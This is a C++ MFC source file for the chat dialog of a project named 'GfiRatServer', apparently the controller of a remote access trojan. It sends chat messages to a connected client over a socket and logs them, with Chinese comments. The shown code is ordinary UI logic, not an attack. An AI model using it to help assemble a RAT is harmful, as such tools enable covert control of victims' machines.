// Chat.cpp : implementation file
//

#include "pch.h"
#include "GfiRatServer.h"
#include "Chat.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CChat dialog


CChat::CChat(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialog(CChat::IDD, pParent)
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_CHAT));
	//{{AFX_DATA_INIT(CChat)
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
}


void CChat::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CChat)
	DDX_Control(pDX, IDC_EDIT_TIP, m_editTip);
	DDX_Control(pDX, IDC_EDIT_NEWMSG, m_editNewMsg);
	DDX_Control(pDX, IDC_EDIT_CHATLOG, m_editChatLog);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CChat, CDialog)
	//{{AFX_MSG_MAP(CChat)
	ON_BN_CLICKED(IDC_BUTTON_SEND, OnButtonSend)
	ON_BN_CLICKED(IDC_BUTTON_END, OnButtonEnd)
	ON_WM_CLOSE()
	ON_WM_CTLCOLOR()
	ON_EN_SETFOCUS(IDC_EDIT_CHATLOG, OnSetfocusEditChatLog)
	ON_EN_KILLFOCUS(IDC_EDIT_CHATLOG, OnKillfocusEditChatLog)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CCHAT message handlers

BOOL CChat::OnInitDialog()
{
	CDialog::OnInitDialog();

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 远程交谈", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	m_editTip.SetWindowText("第一条消息发送后，对方聊天对话框才会弹出");
	m_editNewMsg.SetLimitText(4079);
	// TODO: Add extra initialization here
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

void CChat::OnReceiveComplete()
{
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	CString strResult = (char*)m_pContext->m_DeCompressionBuffer.GetBuffer(0);
	SYSTEMTIME st;
	GetLocalTime(&st);
	char Text[8192] = { 0 };
	sprintf(Text, "%s %d/%d/%d %d:%02d:%02d\r\n  %s\r\n\r\n", "对方:",
		st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, strResult);
	if (m_editChatLog.GetWindowTextLength() >= 20000)
		m_editChatLog.SetWindowText("");
	m_editChatLog.SetSel(-1);
	m_editChatLog.ReplaceSel(Text);
}

void CChat::OnButtonSend()
{
	// TODO: Add your control notification handler code here
	char str[8159];
	GetDlgItemText(IDC_EDIT_NEWMSG, str, sizeof(str));
	if (strcmp(str, "") == 0)
	{
		m_editNewMsg.SetFocus();
		return; // 发送消息为空不处理
	}
	m_editTip.ShowWindow(SW_HIDE);
	m_iocpServer->Send(m_pContext, (LPBYTE)str, strlen(str) + 1);
	SYSTEMTIME st;
	GetLocalTime(&st);
	char Text[8192] = { 0 };
	sprintf(Text, "%s %d/%d/%d %d:%02d:%02d\r\n  %s\r\n\r\n", "自己:",
		st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, str);
	if (m_editChatLog.GetWindowTextLength() >= 20000)
		m_editChatLog.SetWindowText("");
	m_editChatLog.SetSel(-1);
	m_editChatLog.ReplaceSel(Text);
	m_editNewMsg.SetWindowText("");
	m_editNewMsg.SetFocus();
}

void CChat::OnButtonEnd()
{
	// TODO: Add your control notification handler code here
	SendMessage(WM_CLOSE, 0, 0);
}

void CChat::OnClose()
{
	// TODO: Add your message handler code here and/or call default
// 	BYTE bToken = COMMAND_CHAT_CLOSE;
// 	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
// 	AfxMessageBox("远程交谈已结束！");
// 	ShowWindow(SW_HIDE);
// 	Sleep(1000);
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	DestroyWindow();
}

HBRUSH CChat::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	if (pWnd->GetDlgCtrlID() == IDC_EDIT_CHATLOG && nCtlColor == CTLCOLOR_STATIC)
	{
		COLORREF clr = RGB(0, 0, 0);
		pDC->SetTextColor(clr);   //设置黑色的文本
		clr = RGB(255, 255, 255);
		pDC->SetBkColor(clr);     //设置白色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else if (pWnd == &m_editTip && nCtlColor == CTLCOLOR_EDIT)
	{
		COLORREF clr = RGB(255, 0, 0);
		pDC->SetTextColor(clr);   //设置红色的文本
		clr = RGB(220, 220, 0);
		pDC->SetBkColor(clr);     //设置黄色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}

void CChat::PostNcDestroy()
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}

BOOL CChat::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_ESCAPE)
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CChat::OnSetfocusEditChatLog()
{
	// TODO: Add your control notification handler code here
	if (m_editTip.IsWindowVisible())
		m_editTip.RedrawWindow(NULL, NULL, RDW_INVALIDATE | RDW_FRAME);
}

void CChat::OnKillfocusEditChatLog()
{
	// TODO: Add your control notification handler code here
	if (m_editTip.IsWindowVisible())
		m_editTip.RedrawWindow(NULL, NULL, RDW_INVALIDATE | RDW_FRAME);
}
